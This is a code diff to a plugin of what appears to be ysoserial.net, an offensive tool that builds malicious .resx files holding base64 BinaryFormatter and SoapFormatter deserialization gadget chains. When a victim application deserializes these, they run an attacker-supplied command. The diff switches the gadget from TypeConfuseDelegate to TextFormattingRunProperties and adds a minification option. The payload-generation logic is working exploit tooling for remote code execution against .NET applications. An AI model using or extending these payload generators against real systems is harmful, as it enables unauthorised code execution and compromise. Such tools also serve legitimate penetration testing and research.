@@ -2,6 +2,7 @@
 using NDesk.Options;
 using System;
 using ysoserial.Generators;
+using ysoserial.Helpers;
 
 /**
  * Author: Soroush Dalili (@irsdl)
@@ -23,14 +24,16 @@ namespace ysoserial.Plugins
         static string mode = "";
         static string file = "";
         static string command = "";
-        static Boolean minify = false;
+        static bool minify = false;
+        static bool useSimpleType = true;
 
         static OptionSet options = new OptionSet()
             {
                 {"M|mode=", "the payload mode: indirect_resx_file, BinaryFormatter, SoapFormatter.", v => mode = v },
                 {"c|command=", "the command to be executed in BinaryFormatter. If this is provided for SoapFormatter, it will be used as a file for ActivitySurrogateSelectorFromFile", v => command = v },
                 {"F|file=", "UNC file path location: this is used in indirect_resx_file mode.", v => file = v },
-                {"minify", "Whether to minify the payloads where applicable (experimental). Default: false", v => minify =  v != null }
+                {"minify", "Whether to minify the payloads where applicable (experimental). Default: false", v => minify =  v != null },
+                {"ust|usesimpletype", "This is to remove additional info only when minifying and FormatterAssemblyStyle=Simple. Default: true", v => useSimpleType =  v != null },
             };
 
         public string Name()
@@ -131,7 +134,7 @@ namespace ysoserial.Plugins
  </resheader>
  <assembly alias=""System.Windows.Forms"" name=""System.Windows.Forms, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089"" />
 
-<data name=""test"" {0}>
+<data name=""x"" {0}>
  <value>{1}</value>
  </data>
 </root>";
@@ -148,7 +151,7 @@ namespace ysoserial.Plugins
                     if (!String.IsNullOrEmpty(command) && !String.IsNullOrWhiteSpace(command))
                     {
                         mtype = @"mimetype=""application/x-microsoft.net.object.binary.base64""";
-                        byte[] osf = (byte[])new TypeConfuseDelegateGenerator().Generate(command, "BinaryFormatter", false, minify);
+                        byte[] osf = (byte[])new TextFormattingRunPropertiesGenerator().Generate(command, "BinaryFormatter", false, minify, useSimpleType);
                         payloadValue = Convert.ToBase64String(osf);
 
                     }
@@ -157,12 +160,12 @@ namespace ysoserial.Plugins
                     mtype = @"mimetype=""application/x-microsoft.net.object.soap.base64""";
                     if (!String.IsNullOrEmpty(command) && !String.IsNullOrWhiteSpace(command))
                     {
-                        byte[] osf = (byte[])new ActivitySurrogateSelectorFromFileGenerator().Generate(command, "SoapFormatter", false, minify);
+                        byte[] osf = (byte[])new ActivitySurrogateSelectorFromFileGenerator().Generate(command, "SoapFormatter", false, minify, useSimpleType);
                         payloadValue = Convert.ToBase64String(osf);
                     }
                     else
                     {
-                        byte[] osf = (byte[])new ActivitySurrogateSelectorGenerator().Generate("", "SoapFormatter", false, minify);
+                        byte[] osf = (byte[])new ActivitySurrogateSelectorGenerator().Generate("", "SoapFormatter", false, minify, useSimpleType);
                         payloadValue = Convert.ToBase64String(osf);
                     }
                     break;
@@ -180,7 +183,7 @@ namespace ysoserial.Plugins
 
             if (minify)
             {
-                payload = Helpers.XMLMinifier.Minify(payload, null, null);
+                payload = XMLMinifier.Minify(payload, null, null);
             }
 
             return payload;
